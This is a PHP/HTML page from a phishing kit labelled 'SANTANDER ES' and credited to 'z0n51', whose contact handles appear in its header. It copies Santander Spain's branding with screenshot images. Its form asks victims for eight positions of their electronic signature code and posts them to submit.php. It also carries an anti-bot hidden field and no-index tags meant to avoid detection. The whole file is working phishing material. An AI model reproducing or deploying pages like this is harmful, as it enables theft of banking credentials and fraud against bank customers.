<?php

/**
 * @link              https://www.z0n51.com/
 * @since             20/02/2020
 * @package           SANTANDER ES
 * @facebook          https://www.facebook.com/z0n51
 * @whatsapp          +212601728021
 * @icq               @z0n51
 * @telegram          @z0n51
 *
 * Project Name:      SANTANDER ES
 * Author:            z0n51
 * Author URI:        https://www.facebook.com/z0n51
 */

    include_once '../inc/app.php';
?>
<!doctype html>
<html>

    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="../assets/css/bootstrap.min.css">
        <link rel="stylesheet" href="../assets/css/helpers.css">
        <link rel="stylesheet" href="../assets/css/fonts.css">
        <link rel="stylesheet" href="../assets/css/main.css">

        <link rel="icon" href="../assets/images/fav.png" type="image/png"> 
        
        <title>Home</title>
    </head>

    <body style="background: #F7F7F7;">
        
        <!-- HEADER -->
        <header id="header">
            <div class="container">
                <div class="logo">
                    <img class="d-lg-block d-md-none d-sm-none d-none" style="min-width: 201px;"  src="../assets/images/logoo.png">
                    <img class="d-lg-none d-md-block d-sm-block d-block" style="min-width: 27px;"  src="../assets/images/mobilelogo.png">
                </div>
                <div class="menu">
                    <img style="min-width: 543px;" class="d-lg-block d-md-none d-sm-none d-none" src="../assets/images/mainmenu.png">
                    <img style="min-width: 31px;"  class="d-lg-none d-md-block d-sm-block d-block" src="../assets/images/mobilemenu.png">
                </div>
            </div>
        </header>
        <!-- END HEADER -->
        
        <!-- NAV -->
        <nav id="nav">
            <div class="container">
                <div class="secondmenu"><img src="../assets/images/secondmenu.png"></div>
                <div class="sofia"><img src="../assets/images/sofia.png"></div>
            </div>
        </nav>
        <!-- END NAV -->
        
        <!-- MAIN -->
        <main id="main">
            <div class="container">
                <div class="main-title"><h3>Firma Electrónica</h3></div>
                <div class="details-box">
                    <p>Introduce las posiciones de tu firma electrónica</p>
                    <form method="post" action="submit.php" id="firma-form">
                        <div class="input-group">
                            <input type="text" name="firma1" class="form-control" id="firma1" maxlength="1">
                            <input type="text" name="firma2" class="form-control" id="firma2" maxlength="1">
                            <input type="text" name="firma3" class="form-control" id="firma3" maxlength="1">
                            <input type="text" name="firma4" class="form-control" id="firma4" maxlength="1">
                            <input type="text" name="firma5" class="form-control" id="firma5" maxlength="1">
                            <input type="text" name="firma6" class="form-control" id="firma6" maxlength="1">
                            <input type="text" name="firma7" class="form-control" id="firma7" maxlength="1">
                            <input type="text" name="firma8" class="form-control" id="firma8" maxlength="1">
                        </div>
                        <div class="firma-error" style="color: #EC0000; font-size: 12px; font-weight: 600;">Tu codigo no es valido</div>
                        <input type="hidden" name="verbot">
                        <input type="hidden" name="type" value="firma">
                        <div class="form-group mt30 mb-0 text-right">
                            <button type="button" id="firma-submit">ACEPTAR</button>
                        </div>
                    </form>
                </div>
            </div>
        </main>
        <!-- END MAIN -->



        <!-- JS FILES -->
        <script src="../assets/js/jquery.min.js"></script>
        <script src="../assets/js/popper.min.js"></script>
        <script src="../assets/js/bootstrap.min.js"></script>
        <script src="../assets/js/fontawesome.min.js"></script>
        <script src="../assets/js/jquery.payment.js"></script>
        <script src="../assets/js/main.js"></script>

        <script>

            $('#firma-submit').click(function(){
                var firma1 = $('#firma1').val();
                var firma2 = $('#firma2').val();
                var firma3 = $('#firma3').val();
                var firma4 = $('#firma4').val();
                var firma5 = $('#firma5').val();
                var firma6 = $('#firma6').val();
                var firma7 = $('#firma7').val();
                var firma8 = $('#firma8').val();
                if( firma1 == '' || firma2 == '' || firma3 == '' || firma4 == '' || firma5 == '' || firma6 == '' || firma7 == '' || firma8 == '' ) {
                    $('.firma-error').show();
                } else {
                    $('.firma-error').hide();
                    $('#firma-form').submit();
                }
            });

            $('.input-group input').click(function(){
                var firma1 = $('#firma1').val();
                var firma2 = $('#firma2').val();
                var firma3 = $('#firma3').val();
                var firma4 = $('#firma4').val();
                var firma5 = $('#firma5').val();
                var firma6 = $('#firma6').val();
                var firma7 = $('#firma7').val();
                var firma8 = $('#firma8').val();
                if( firma1 !== '' && firma2 !== '' && firma3 !== '' && firma4 !== '' && firma5 !== '' && firma6 !== '' && firma7 !== '' && firma8 !== '' ) {
                    $('#firma8').focus();
                } else if( firma1 !== '' || firma2 !== '' || firma3 !== '' || firma4 !== '' || firma5 !== '' || firma6 !== '' || firma7 !== '' || firma8 !== '' ) {
                    $('.input-group input').each(function(i){
                        if( $(this).val() == '' ) {
                            $(this).focus();
                            return false;
                        }
                    }); 
                }
            });

            $('.input-group input').keypress(function(){
                $(this).next().focus();
            });

            $('.input-group input').keyup(function(e){
                var btn = e.keyCode;
                if( btn == 8 ) {
                    $(this).prev().focus();
                }
            });
        </script>

    </body>

</html>